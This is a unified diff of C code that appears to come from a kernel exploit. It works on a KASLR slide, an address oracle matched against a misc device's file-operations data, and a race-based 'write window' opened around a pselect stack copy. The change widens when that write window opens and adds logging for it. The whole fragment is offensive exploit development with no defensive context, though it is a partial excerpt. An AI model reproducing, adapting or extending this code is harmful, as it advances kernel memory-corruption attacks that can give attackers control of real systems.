@@ -45,6 +45,15 @@ static int slide_syscall_pad;
 
 static int slide_commit_stext(uint64_t stext, const char *source);
 
+static int slide_is_app_fops_route(void) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  return slide_oracle_target != 0 &&
+         slide_oracle_target == misc_fops_data_addr();
+#else
+  return 0;
+#endif
+}
+
 static useconds_t slide_enter_delay_usec(void) {
   const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
   if (!forced || !*forced) {
@@ -316,10 +325,14 @@ void slide_pselect_stack_copy(void) {
     }
   }
 
+  int sched_ok = atomic_load(&slide_consume_sched_ok) > 0;
+  int fops_route = slide_is_app_fops_route();
+  int write_window = sched_ok && (ret > 0 || fops_route);
   pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
           "elapsed_usec=%zu "
           "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d\n",
+          "last_sched_ret=%d last_sched_errno=%d write_window=%d "
+          "fops_route=%d\n",
           slide_pselect_nfds, slide_syscall_pad, ret, saved_errno,
           pselect_elapsed_usec,
           atomic_load(&slide_consumer_ready),
@@ -328,9 +341,9 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
-          atomic_load(&slide_consume_last_sched_errno));
-  atomic_store(&slide_pselect_write_window,
-               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+          atomic_load(&slide_consume_last_sched_errno), write_window,
+          fops_route);
+  atomic_store(&slide_pselect_write_window, write_window);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
